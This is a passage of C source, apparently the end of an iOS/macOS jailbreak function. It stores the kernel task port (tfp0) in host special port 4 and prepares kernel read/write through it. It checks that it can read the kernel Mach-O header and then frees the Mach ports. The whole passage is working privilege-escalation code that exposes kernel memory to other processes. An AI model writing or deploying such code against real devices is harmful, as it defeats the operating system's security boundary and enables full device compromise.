        LOG("failed to set hsp4! error: %x %s, port: %x", ret, mach_error_string(ret), hsp4);
        goto out;   
    }
    
    prepare_rwk_via_tfp0(hsp4);

    /* test it */
    kbase_value = (uint32_t)(ReadKernel64(kernel_base));
    if ((uint32_t)kbase_value != MH_MAGIC_64)
    {
        LOG("failed to read from kernel base & test hsp4!");
        ret = KERN_FAILURE;
        goto out;
    }
    
    if (MACH_PORT_VALID(host)) {
        mach_port_deallocate(mach_task_self(), host);
        host = MACH_PORT_NULL;
    }
    
    if (MACH_PORT_VALID(thread)) {
        mach_port_deallocate(mach_task_self(), thread);
        thread = THREAD_NULL;
    }
    
    ret = KERN_SUCCESS;

out:;
    return ret;
}
